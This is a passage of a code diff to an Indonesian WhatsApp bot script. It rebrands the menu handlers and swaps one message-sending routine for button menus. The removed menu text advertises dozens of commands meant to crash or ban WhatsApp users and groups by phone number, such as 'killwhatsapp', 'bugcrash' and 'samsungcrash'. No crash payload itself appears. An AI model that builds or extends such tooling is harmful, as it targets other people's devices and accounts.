-┃⭔ ${prefix}tecno-vip *+628xxx*
-┃⭔ ${prefix}jids-engine *+628xxx*
-┃⭔ ${prefix}jids-internal *+628xxx*
-┃⭔ ${prefix}jids-external *+628xxx*
-┃⭔ ${prefix}jids-system *+628xxx*
-┃⭔ ${prefix}ipcrash *+628xxx*
-┃
-┗❐
-
-┏❐   \`Bug Crash Emote VIP\`
-┃
-┃⭔ ${prefix}🍁 *+628xxx*
-┃⭔ ${prefix}✨ *+628xxx*
-┃⭔ ${prefix}💯 *+628xxx*
-┃⭔ ${prefix}💋 *+628xxx*
-┃⭔ ${prefix}👅 *+628xxx*
-┃⭔ ${prefix}🌀 *+628xxx*
-┃⭔ ${prefix}⚡ *+628xxx*
-┃
-┗❐  `
-anuges = {
-viewOnceMessage: {
-message: {
-interactiveMessage: {
-"contextInfo": {
-"mentionedJid": [m.sender],
-"isForwarded": true,
-"forwardedNewsletterMessageInfo": {
-"newsletterJid": '0@newsletter',
-"newsletterName": 'By RxhL+',
-"serverMessageId": 1
-},
-},
-"header": {
-"title": ewe,
-...(await prepareWAMessageMedia({ image: rxhlimage }, { upload: rxhl.waUploadToServer })),
-"hasMediaAttachment": true
-},
-"body": {
-"text": ""
-},
-"footer": {
-"text": "RxhL Official"
-},
-"nativeFlowMessage": {
-"buttons": [
-{
-"name": "cta_url",
-"buttonParamsJson": "{\"display_text\":\"Saluran WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H\"}"
-}
-],
-"messageParamsJson": ""
-}
-}
-}
-}
-};
-rxhl.relayMessage(from, anuges, {})
-break
-case 'allbugmenu':
-await loading()
-
-ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
-┃⭔ Creator : 𝐃𝚫𝐍𝐗𝐙𝐘𝐘𝐂𝐑𝚪𝚫𝐒𝐇𝟔𝟔𝟔
-┃⭔ Partner : -
-┃⭔ Type : Case
-┃⭔ Status : Online
-┃⭔ Mode : ${rxhl.public ? 'Public' : 'Self'}
-┃⭔ Prefix : Multi 
-┗❐
- 
-┏❐   \`Bot Fitur\` 
-┃
-┃⭔ ${prefix}self 
-┃⭔ ${prefix}public 
-┃⭔ ${prefix}blok *628xxx*
-┃⭔ ${prefix}unblok *628xx*
-┃⭔ ${prefix}setppbot
-┃⭔ ${prefix}setppbot /full
-┃
-┗❐
-
-┏❐   \`Bug Crash Chat V1\`
-┃
-┃⭔ ${prefix}bugcrash *+628xxx*
-┃⭔ ${prefix}bugsystem *+628xxx*
-┃⭔ ${prefix}crash1jam *+628xxx*
-┃⭔ ${prefix}crash1hari *+628xxx*
-┃⭔ ${prefix}xreactpc *+628xxx*
-┃⭔ ${prefix}bugiospc *+628xxx|Amount*
-┃⭔ ${prefix}bugaudiopc *+628xxx|Amount*
-┃⭔ ${prefix}buglocpc *+628xxx|Amount*
-┃⭔ ${prefix}bugparamspc *+628xxx|Amount*
-┃⭔ ${prefix}bughomepc *+628xxx|Amount*
-┃⭔ ${prefix}bannedno *+628xxx*
-┃⭔ ${prefix}bugvid1
-┃⭔ ${prefix}bugvid2
-┃
-┗❐
-
-┏❐   \`Bug Crash Grup V1\`
-┃
-┃⭔ ${prefix}bugcrashv2 *Id Grup*
-┃⭔ ${prefix}bugsystemv2  *Id Grup*
-┃⭔ ${prefix}xreactgc  *Id Grup*
-┃⭔ ${prefix}bugiosgc *Id Grup|Amount*
-┃⭔ ${prefix}bugaudiogc *Id Grup|Amount*
-┃⭔ ${prefix}buglocgc *Id Grup|Amount*
-┃⭔ ${prefix}bugparamsgc *Id Grup|Amount*
-┃⭔ ${prefix}bughomegc *Id Grup|Amount*
-┃⭔ ${prefix}getidgrup *Link Gc*
-┃
-┗❐
-
-┏❐   \`Bug Crash In Place V1\`
-┃
-┃⭔ ${prefix}bugcrashv3
-┃⭔ ${prefix}bugsystemv3  
-┃⭔ ${prefix}bugparamsin 
-┃
-┗❐
-
-┏❐   \`Bug Crash Emote V1\`
-┃
-┃⭔ ${prefix}🔥  *+628xxx|Amount*
-┃⭔ ${prefix}♥️  *+628xxx|Amount*
-┃⭔ ${prefix}🥰  *+628xxx|Amount*
-┃⭔ ${prefix}🤤  *+628xxx|Amount*
-┃⭔ ${prefix}😱  *+628xxx|Amount*
-┃⭔ ${prefix}💝  *+628xxx|Amount*
-┃⭔ ${prefix}😭  *+628xxx|Amount*
-┃⭔ ${prefix}😁  *+628xxx|Amount*
-┃⭔ ${prefix}🔥  *+628xxx|Amount*
-┃⭔ ${prefix}😡  *+628xxx|Amount*
-┃⭔ ${prefix}😒  *+628xxx|Amount*
-┃
-┗❐
-
-┏❐   \`Special Bug V1\`
-┃
-┃⭔ ${prefix}rxhlbug *628xxx|Amount*
-┃⭔ ${prefix}rxhlkeren *628xxx|Amount*
-┃⭔ ${prefix}rxhlganteng *628xxx|Amount*
-┃⭔ ${prefix}rxhlios *628xxx|Amount*
-┃⭔ ${prefix}rxhlandro *628xxx|Amount*
-┃
-┗❐
-
-┏❐   \`Bug Crash Chat V2\`
-┃
-┃⭔ ${prefix}iosfull *+628xxx|Amount*
-┃⭔ ${prefix}iosfullv2 *+628xxx|Amount*
-┃⭔ ${prefix}samsungcrash *+628xxx|Amount*
-┃⭔ ${prefix}samsungfull *+628xxx|Amount*
-┃⭔ ${prefix}samsung-brutal *+628xxx|Amount*
-┃⭔ ${prefix}slayer07 *+628xxx|Amount*
-┃⭔ ${prefix}darkness *+628xxx|Amount*
-┃⭔ ${prefix}virkon *+628xxx|Amount*
-┃⭔ ${prefix}virgam *+628xxx|Amount*
-┃⭔ ${prefix}fatal-ui *+628xxx|Amount*
-┃⭔ ${prefix}fatal-notif *+628xxx|Amount*
-┃⭔ ${prefix}bug-brutal *+628xxx|Amount*
-┃⭔ ${prefix}crash-all-dvc *+628xxx|Amount*
-┃
-┗❐ 
-
-┏❐   \`Bug Crash Chat V3\`
-┃
-┃⭔ ${prefix}all-dvc2 *+628xxx*
-┃⭔ ${prefix}killwhatsapp *+628xxx*
-┃⭔ ${prefix}auto-crash *+628xxx*
-┃⭔ ${prefix}new-bunga *+628xxx*
-┃⭔ ${prefix}kill-ripper *+628xxx*
-┃⭔ ${prefix}external-crash1 *+628xxx*
-┃⭔ ${prefix}external-crash2 *+628xxx*
-┃⭔ ${prefix}external-crash3 *+628xxx*
-┃⭔ ${prefix}internal-crash1 *+628xxx*
-┃⭔ ${prefix}internal-crash2 *+628xxx*
-┃⭔ ${prefix}onlyios-crash *+628xxx*
-┃⭔ ${prefix}onlysamsung-crash *+628xxx*
-┃
-┗❐
-
-┏❐   \`Bug Crash Grup V3\`
-┃
-┃⭔ ${prefix}crashgc-v1 *ID GRUP*
-┃⭔ ${prefix}crashgc-v2 *ID GRUP*
-┃
-┗❐
-
-┏❐   \`Bug Andro / IP VIP\`
-┃
-┃⭔ ${prefix}bug-vip *+628xxx*
-┃⭔ ${prefix}super-vip *+628xxx*
-┃⭔ ${prefix}samsung-vip *+628xxx*
-┃⭔ ${prefix}oppo-vip *+628xxx*
-┃⭔ ${prefix}vivo-vip *+628xxx*
-┃⭔ ${prefix}xiaomi-vip *+628xxx*
-┃⭔ ${prefix}infinix-vip *+628xxx*
-┃⭔ ${prefix}tecno-vip *+628xxx*
-┃⭔ ${prefix}jids-engine *+628xxx*
-┃⭔ ${prefix}jids-internal *+628xxx*
-┃⭔ ${prefix}jids-external *+628xxx*
-┃⭔ ${prefix}jids-system *+628xxx*
-┃⭔ ${prefix}ipcrash *+628xxx*
-┃
-┗❐
-
-┏❐   \`Bug Crash Emote VIP\`
-┃
-┃⭔ ${prefix}🍁 *+628xxx*
-┃⭔ ${prefix}✨ *+628xxx*
-┃⭔ ${prefix}💯 *+628xxx*
-┃⭔ ${prefix}💋 *+628xxx*
-┃⭔ ${prefix}👅 *+628xxx*
-┃⭔ ${prefix}🌀 *+628xxx*
-┃⭔ ${prefix}⚡ *+628xxx*
-┃
-┗❐  `
-anuges = {
-viewOnceMessage: {
-message: {
-interactiveMessage: {
-"contextInfo": {
-"mentionedJid": [m.sender],
-"isForwarded": true,
-"forwardedNewsletterMessageInfo": {
-"newsletterJid": '0@newsletter',
-"newsletterName": 'By RxhL+',
-"serverMessageId": 1
-},
-},
-"header": {
-"title": ewe,
-...(await prepareWAMessageMedia({ image: rxhlimage }, { upload: rxhl.waUploadToServer })),
-"hasMediaAttachment": true
-},
-"body": {
-"text": ""
-},
-"footer": {
-"text": "RxhL Official"
-},
-"nativeFlowMessage": {
-"buttons": [
-{
-"name": "cta_url",
-"buttonParamsJson": "{\"display_text\":\"Saluran WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H\"}"
-}
-],
-"messageParamsJson": ""
-}
-}
-}
-}
-};
-rxhl.relayMessage(from, anuges, {})
+rxhl.sendButton(from,  hohe, m, {
+body: ewe,
+footer: `RxhlOfficial`
+})
 break
 // TXT MENU
 case 'txtmenu':
 await loading()
-
-ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
-┃⭔ Creator : 𝐃𝚫𝐍𝐗𝐙𝐘𝐘𝐂𝐑𝚪𝚫𝐒𝐇𝟔𝟔𝟔
+hohe = [
+  {
+                'name': 'single_select',
+                'buttonParamsJson': "{'title':'RXHL OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY RXHL OFC','description':'Telegram: @rxhlvro','id':'.kontplbinatang'}]}]}"
+              },
+              {
+   name: "cta_url",
+   buttonParamsJson: JSON.stringify({
+      display_text: "My Channel",
+      url: "https://www.youtube.com/@rxhlofc",
+      merchant_url: "https://www.youtube.com/@rxhlofc"
+   })
+}
+]
+ewe = `┏❐  ⌜ RxhL - Bot - V6 ⌟  ❐
+┃⭔ Creator : Rxhl Official
 ┃⭔ Partner : -
 ┃⭔ Type : Case
 ┃⭔ Status : Online
@@ -1677,8 +936,6 @@ ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
 ┃
 ┃⭔ ${prefix}self 
 ┃⭔ ${prefix}public 
-┃⭔ ${prefix}blok *628xxx*
-┃⭔ ${prefix}unblok *628xx*
 ┃⭔ ${prefix}setppbot
 ┃⭔ ${prefix}setppbot /full
 ┃
@@ -1691,51 +948,30 @@ ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
 ┃⭔ ${prefix}txtban3
 ┃
 ┗❐`
-anuges = {
-viewOnceMessage: {
-message: {
-interactiveMessage: {
-"contextInfo": {
-"mentionedJid": [m.sender],
-"isForwarded": true,
-"forwardedNewsletterMessageInfo": {
-"newsletterJid": '0@newsletter',
-"newsletterName": 'By RxhL+',
-"serverMessageId": 1
-},
-},
-"header": {
-"title": ewe,
-...(await prepareWAMessageMedia({ image: rxhlimage }, { upload: rxhl.waUploadToServer })),
-"hasMediaAttachment": true
-},
-"body": {
-"text": ""
-},
-"footer": {
-"text": "RxhL Official"
-},
-"nativeFlowMessage": {
-"buttons": [
-{
-"name": "cta_url",
-"buttonParamsJson": "{\"display_text\":\"Saluran WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H\"}"
-}
-],
-"messageParamsJson": ""
-}
-}
-}
-}
-};
-rxhl.relayMessage(from, anuges, {})
+rxhl.sendButton(from,  hohe, m, {
+body: ewe,
+footer: `RxhlOfficial`
+})
 break
 // AKSES MENU
 case 'aksesmenu':
 await loading()
-
-ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
-┃⭔ Creator : 𝐃𝚫𝐍𝐗𝐙𝐘𝐘𝐂𝐑𝚪𝚫𝐒𝐇𝟔𝟔𝟔
+hohe = [
+  {
+                'name': 'single_select',
+                'buttonParamsJson': "{'title':'RXHL OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY RXHL OFC','description':'Telegram: @rxhlvro','id':'.kontplbinatang'}]}]}"
+              },
+              {
+   name: "cta_url",
+   buttonParamsJson: JSON.stringify({
+      display_text: "My Channel",
+      url: "https://www.youtube.com/@rxhlofc",
+      merchant_url: "https://www.youtube.com/@rxhlofc"
+   })
+}
+]
+ewe = `┏❐  ⌜ RxhL - Bot - V6 ⌟  ❐
+┃⭔ Creator : Rxhl Official
 ┃⭔ Partner : -
 ┃⭔ Type : Case
 ┃⭔ Status : Online
@@ -1747,8 +983,6 @@ ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
 ┃
 ┃⭔ ${prefix}self 
 ┃⭔ ${prefix}public 
-┃⭔ ${prefix}blok *628xxx*
-┃⭔ ${prefix}unblok *628xx*
 ┃⭔ ${prefix}setppbot
 ┃⭔ ${prefix}setppbot /full
 ┃
@@ -1760,55 +994,33 @@ ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
 ┃⭔ ${prefix}dellowner 62xxx
 ┃⭔ ${prefix}addmurbug 62xxx
 ┃⭔ ${prefix}dellmurbug 62xxx
-┃⭔ ${prefix}listowner
-┃⭔ ${prefix}listmurbug
+┃⭔ ${prefix}listuser
 ┃
 ┗❐`
-anuges = {
-viewOnceMessage: {
-message: {
-interactiveMessage: {
-"contextInfo": {
-"mentionedJid": [m.sender],
-"isForwarded": true,
-"forwardedNewsletterMessageInfo": {
-"newsletterJid": '0@newsletter',
-"newsletterName": 'By RxhL+',
-"serverMessageId": 1
-},
-},
-"header": {
-"title": ewe,
-...(await prepareWAMessageMedia({ image: rxhlimage }, { upload: rxhl.waUploadToServer })),
-"hasMediaAttachment": true
-},
-"body": {
-"text": ""
-},
-"footer": {
-"text": "RxhL Official"
-},
-"nativeFlowMessage": {
-"buttons": [
-{
-"name": "cta_url",
-"buttonParamsJson": "{\"display_text\":\"Saluran WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H\"}"
-}
-],
-"messageParamsJson": ""
-}
-}
-}
-}
-};
-rxhl.relayMessage(from, anuges, {})
+rxhl.sendButton(from,  hohe, m, {
+body: ewe,
+footer: `RxhlOfficial`
+})
 break
 // SOUND MENU
 case 'soundmenu':
 await loading()
-
-ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
-┃⭔ Creator : 𝐃𝚫𝐍𝐗𝐙𝐘𝐘𝐂𝐑𝚪𝚫𝐒𝐇𝟔𝟔𝟔
+hohe = [
+  {
+                'name': 'single_select',
+                'buttonParamsJson': "{'title':'RXHL OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY RXHL OFC','description':'Telegram: @rxhlvro','id':'.kontplbinatang'}]}]}"
+              },
+              {
+   name: "cta_url",
+   buttonParamsJson: JSON.stringify({
+      display_text: "My Channel",
+      url: "https://www.youtube.com/@rxhlofc",
+      merchant_url: "https://www.youtube.com/@rxhlofc"
+   })
+}
+]
+ewe = `┏❐  ⌜ RxhL - Bot - V6 ⌟  ❐
+┃⭔ Creator : Rxhl Official
 ┃⭔ Partner : -
 ┃⭔ Type : Case
 ┃⭔ Status : Online
@@ -1820,8 +1032,6 @@ ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
 ┃
 ┃⭔ ${prefix}self 
 ┃⭔ ${prefix}public 
-┃⭔ ${prefix}blok *628xxx*
-┃⭔ ${prefix}unblok *628xx*
 ┃⭔ ${prefix}setppbot
 ┃⭔ ${prefix}setppbot /full
 ┃
@@ -1992,51 +1202,30 @@ ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
 ┃⭔ ${prefix}sound161
 ┃
 ┗❐`
-anuges = {
-viewOnceMessage: {
-message: {
-interactiveMessage: {
-"contextInfo": {
-"mentionedJid": [m.sender],
-"isForwarded": true,
-"forwardedNewsletterMessageInfo": {
-"newsletterJid": '0@newsletter',
-"newsletterName": 'By RxhL+',
-"serverMessageId": 1
-},
-},
-"header": {
-"title": ewe,
-...(await prepareWAMessageMedia({ image: rxhlimage }, { upload: rxhl.waUploadToServer })),
-"hasMediaAttachment": true
-},
-"body": {
-"text": ""
-},
-"footer": {
-"text": "RxhL Official"
-},
-"nativeFlowMessage": {
-"buttons": [
-{
-"name": "cta_url",
-"buttonParamsJson": "{\"display_text\":\"Saluran WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H\"}"
-}
-],
-"messageParamsJson": ""
-}
-}
-}
-}
-};
-rxhl.relayMessage(from, anuges, {})
+rxhl.sendButton(from,  hohe, m, {
+body: ewe,
+footer: `RxhlOfficial`
+})
 break
 // GROUP MENU
 case 'groupmenu':
 await loading()
-
-ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
-┃⭔ Creator : 𝐃𝚫𝐍𝐗𝐙𝐘𝐘𝐂𝐑𝚪𝚫𝐒𝐇𝟔𝟔𝟔
+hohe = [
+  {
+                'name': 'single_select',
+                'buttonParamsJson': "{'title':'RXHL OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY RXHL OFC','description':'Telegram: @rxhlvro','id':'.kontplbinatang'}]}]}"
+              },
+              {
+   name: "cta_url",
+   buttonParamsJson: JSON.stringify({
+      display_text: "My Channel",
+      url: "https://www.youtube.com/@rxhlofc",
+      merchant_url: "https://www.youtube.com/@rxhlofc"
+   })
+}
+]
+ewe = `┏❐  ⌜ RxhL - Bot - V6 ⌟  ❐
+┃⭔ Creator : Rxhl Official
 ┃⭔ Partner : -
 ┃⭔ Type : Case
 ┃⭔ Status : Online
@@ -2048,8 +1237,6 @@ ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
 ┃
 ┃⭔ ${prefix}self 
 ┃⭔ ${prefix}public 
-┃⭔ ${prefix}blok *628xxx*
-┃⭔ ${prefix}unblok *628xx*
 ┃⭔ ${prefix}setppbot
 ┃⭔ ${prefix}setppbot /full
 ┃
@@ -2071,51 +1258,30 @@ ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
 ┃⭔ ${prefix}resetlinkgc
 ┃
 ┗❐`
-anuges = {
-viewOnceMessage: {
-message: {
-interactiveMessage: {
-"contextInfo": {
-"mentionedJid": [m.sender],
-"isForwarded": true,
-"forwardedNewsletterMessageInfo": {
-"newsletterJid": '0@newsletter',
-"newsletterName": 'By RxhL+',
-"serverMessageId": 1
-},
-},
-"header": {
-"title": ewe,
-...(await prepareWAMessageMedia({ image: rxhlimage }, { upload: rxhl.waUploadToServer })),
-"hasMediaAttachment": true
-},
-"body": {
-"text": ""
-},
-"footer": {
-"text": "RxhL Official"
-},
-"nativeFlowMessage": {
-"buttons": [
-{
-"name": "cta_url",
-"buttonParamsJson": "{\"display_text\":\"Saluran WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H\"}"
-}
-],
-"messageParamsJson": ""
-}
-}
-}
-}
-};
-rxhl.relayMessage(from, anuges, {})
+rxhl.sendButton(from,  hohe, m, {
+body: ewe,
+footer: `RxhlOfficial`
+})
 break
 // RXHL MENU
 case 'rxhlmenu':
 await loading()
-
-ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
-┃⭔ Creator : 𝐃𝚫𝐍𝐗𝐙𝐘𝐘𝐂𝐑𝚪𝚫𝐒𝐇𝟔𝟔𝟔
+hohe = [
+  {
+                'name': 'single_select',
+                'buttonParamsJson': "{'title':'RXHL OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY RXHL OFC','description':'Telegram: @rxhlvro','id':'.kontplbinatang'}]}]}"
+              },
+              {
+   name: "cta_url",
+   buttonParamsJson: JSON.stringify({
+      display_text: "My Channel",
+      url: "https://www.youtube.com/@rxhlofc",
+      merchant_url: "https://www.youtube.com/@rxhlofc"
+   })
+}
+]
+ewe = `┏❐  ⌜ RxhL - Bot - V6 ⌟  ❐
+┃⭔ Creator : Rxhl Official
 ┃⭔ Partner : -
 ┃⭔ Type : Case
 ┃⭔ Status : Online
@@ -2127,8 +1293,6 @@ ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
 ┃
 ┃⭔ ${prefix}self 
 ┃⭔ ${prefix}public 
-┃⭔ ${prefix}blok *628xxx*
-┃⭔ ${prefix}unblok *628xx*
 ┃⭔ ${prefix}setppbot
 ┃⭔ ${prefix}setppbot /full
 ┃
@@ -2144,50 +1308,30 @@ ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
 ┃⭔ ${prefix}nowa *62xx*
 ┃
 ┗❐`
-anuges = {
-viewOnceMessage: {
-message: {
-interactiveMessage: {
-"contextInfo": {
-"mentionedJid": [m.sender],
-"isForwarded": true,
-"forwardedNewsletterMessageInfo": {
-"newsletterJid": '0@newsletter',
-"newsletterName": 'By RxhL+',
-"serverMessageId": 1
-},
-},
-"header": {
-"title": ewe,
-...(await prepareWAMessageMedia({ image: rxhlimage }, { upload: rxhl.waUploadToServer })),
-"hasMediaAttachment": true
-},
-"body": {
-"text": ""
-},
-"footer": {
-"text": "RxhL Official"
-},
-"nativeFlowMessage": {
-"buttons": [
-{
-"name": "cta_url",
-"buttonParamsJson": "{\"display_text\":\"Saluran WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H\"}"
-}
-],
-"messageParamsJson": ""
-}
-}
-}
-}
-};
-rxhl.relayMessage(from, anuges, {})
+rxhl.sendButton(from,  hohe, m, {
+body: ewe,
+footer: `RxhlOfficial`
+})
 break
 // STICKER MENU
 case 'stickermenu':
 await loading()
-ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
-┃⭔ Creator : 𝐃𝚫𝐍𝐗𝐙𝐘𝐘𝐂𝐑𝚪𝚫𝐒𝐇𝟔𝟔𝟔
+hohe = [
+  {
+                'name': 'single_select',
+                'buttonParamsJson': "{'title':'RXHL OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY RXHL OFC','description':'Telegram: @rxhlvro','id':'.kontplbinatang'}]}]}"
+              },
+              {
+   name: "cta_url",
+   buttonParamsJson: JSON.stringify({
+      display_text: "My Channel",
+      url: "https://www.youtube.com/@rxhlofc",
+      merchant_url: "https://www.youtube.com/@rxhlofc"
+   })
+}
+]
+ewe = `┏❐  ⌜ RxhL - Bot - V6 ⌟  ❐
+┃⭔ Creator : Rxhl Official
 ┃⭔ Partner : -
 ┃⭔ Type : Case
 ┃⭔ Status : Online
@@ -2199,8 +1343,6 @@ ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
 ┃
 ┃⭔ ${prefix}self 
 ┃⭔ ${prefix}public 
-┃⭔ ${prefix}blok *628xxx*
-┃⭔ ${prefix}unblok *628xx*
 ┃⭔ ${prefix}setppbot
 ┃⭔ ${prefix}setppbot /full
 ┃
@@ -2213,51 +1355,30 @@ ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
 ┃⭔ ${prefix}smeme
 ┃
 ┗❐`
-anuges = {
-viewOnceMessage: {
-message: {
-interactiveMessage: {
-"contextInfo": {
-"mentionedJid": [m.sender],
-"isForwarded": true,
-"forwardedNewsletterMessageInfo": {
-"newsletterJid": '0@newsletter',
-"newsletterName": 'By RxhL+',
-"serverMessageId": 1
-},
-},
-"header": {
-"title": ewe,
-...(await prepareWAMessageMedia({ image: rxhlimage }, { upload: rxhl.waUploadToServer })),
-"hasMediaAttachment": true
-},
-"body": {
-"text": ""
-},
-"footer": {
-"text": "RxhL Official"
-},
-"nativeFlowMessage": {
-"buttons": [
-{
-"name": "cta_url",
-"buttonParamsJson": "{\"display_text\":\"Saluran WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H\"}"
-}
-],
-"messageParamsJson": ""
-}
-}
-}
-}
-};
-rxhl.relayMessage(from, anuges, {})
+rxhl.sendButton(from,  hohe, m, {
+body: ewe,
+footer: `RxhlOfficial`
+})
 break
 // DOWNLOAD MENU
 case 'downloadmenu':
 await loading()
-
-ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
-┃⭔ Creator : 𝐃𝚫𝐍𝐗𝐙𝐘𝐘𝐂𝐑𝚪𝚫𝐒𝐇𝟔𝟔𝟔
+hohe = [
+  {
+                'name': 'single_select',
+                'buttonParamsJson': "{'title':'RXHL OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY RXHL OFC','description':'Telegram: @rxhlvro','id':'.kontplbinatang'}]}]}"
+              },
+              {
+   name: "cta_url",
+   buttonParamsJson: JSON.stringify({
+      display_text: "My Channel",
+      url: "https://www.youtube.com/@rxhlofc",
+      merchant_url: "https://www.youtube.com/@rxhlofc"
+   })
+}
+]
+ewe = `┏❐  ⌜ RxhL - Bot - V6 ⌟  ❐
+┃⭔ Creator : Rxhl Official
 ┃⭔ Partner : -
 ┃⭔ Type : Case
 ┃⭔ Status : Online
@@ -2269,8 +1390,6 @@ ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
 ┃
 ┃⭔ ${prefix}self 
 ┃⭔ ${prefix}public 
-┃⭔ ${prefix}blok *628xxx*
-┃⭔ ${prefix}unblok *628xx*
 ┃⭔ ${prefix}setppbot
 ┃⭔ ${prefix}setppbot /full
 ┃
@@ -2285,51 +1404,30 @@ ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
 ┃⭔ ${prefix}yts *judul*
 ┃
 ┗❐`
-anuges = {
-viewOnceMessage: {
-message: {
-interactiveMessage: {
-"contextInfo": {
-"mentionedJid": [m.sender],
-"isForwarded": true,
-"forwardedNewsletterMessageInfo": {
-"newsletterJid": '0@newsletter',
-"newsletterName": 'By RxhL+',
-"serverMessageId": 1
-},
-},
-"header": {
-"title": ewe,
-...(await prepareWAMessageMedia({ image: rxhlimage }, { upload: rxhl.waUploadToServer })),
-"hasMediaAttachment": true
-},
-"body": {
-"text": ""
-},
-"footer": {
-"text": "RxhL Official"
-},
-"nativeFlowMessage": {
-"buttons": [
-{
-"name": "cta_url",
-"buttonParamsJson": "{\"display_text\":\"Saluran WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H\"}"
-}
-],
-"messageParamsJson": ""
-}
-}
-}
-}
-};
-rxhl.relayMessage(from, anuges, {})
+rxhl.sendButton(from,  hohe, m, {
+body: ewe,
+footer: `RxhlOfficial`
+})
 break
 // TOOLS MENU
 case 'toolsmenu':
 await loading()
-
-ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
-┃⭔ Creator : 𝐃𝚫𝐍𝐗𝐙𝐘𝐘𝐂𝐑𝚪𝚫𝐒𝐇𝟔𝟔𝟔
+hohe = [
+  {
+                'name': 'single_select',
+                'buttonParamsJson': "{'title':'RXHL OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY RXHL OFC','description':'Telegram: @rxhlvro','id':'.kontplbinatang'}]}]}"
+              },
+              {
+   name: "cta_url",
+   buttonParamsJson: JSON.stringify({
+      display_text: "My Channel",
+      url: "https://www.youtube.com/@rxhlofc",
+      merchant_url: "https://www.youtube.com/@rxhlofc"
+   })
+}
+]
+ewe = `┏❐  ⌜ RxhL - Bot - V6 ⌟  ❐
+┃⭔ Creator : Rxhl Official
 ┃⭔ Partner : -
 ┃⭔ Type : Case
 ┃⭔ Status : Online
@@ -2341,8 +1439,6 @@ ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
 ┃
 ┃⭔ ${prefix}self 
 ┃⭔ ${prefix}public 
-┃⭔ ${prefix}blok *628xxx*
-┃⭔ ${prefix}unblok *628xx*
 ┃⭔ ${prefix}setppbot
 ┃⭔ ${prefix}setppbot /full
 ┃
@@ -2355,51 +1451,30 @@ ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
 ┃⭔ ${prefix}tourl *reply media*
 ┃
 ┗❐`
-anuges = {
-viewOnceMessage: {
-message: {
-interactiveMessage: {
-"contextInfo": {
-"mentionedJid": [m.sender],
-"isForwarded": true,
-"forwardedNewsletterMessageInfo": {
-"newsletterJid": '0@newsletter',
-"newsletterName": 'By RxhL+',
-"serverMessageId": 1
-},
-},
-"header": {
-"title": ewe,
-...(await prepareWAMessageMedia({ image: rxhlimage }, { upload: rxhl.waUploadToServer })),
-"hasMediaAttachment": true
-},
-"body": {
-"text": ""
-},
-"footer": {
-"text": "RxhL Official"
-},
-"nativeFlowMessage": {
-"buttons": [
-{
-"name": "cta_url",
